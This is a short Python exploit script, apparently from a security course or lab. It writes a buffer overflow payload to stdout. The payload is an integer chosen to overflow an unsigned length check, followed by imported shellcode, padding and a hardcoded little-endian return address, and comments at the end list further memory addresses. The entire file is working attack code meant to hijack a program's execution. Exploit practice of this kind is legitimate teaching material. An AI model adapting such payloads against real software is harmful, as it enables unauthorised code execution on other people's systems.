import sys
from shellcode import shellcode

shells_addy = 0xfff6cc00
byty = shells_addy.to_bytes(4, 'little')
padding = b'AA'*(27)
overflower = 1073741837 # overflow possible (max of unsigned int + len shellcode) divided by 4
og = overflower.to_bytes(4,'little')

sys.stdout.buffer.write(og + shellcode + padding + b'A'+ byty)


#0x08048ccb
#0xfff6cc68
#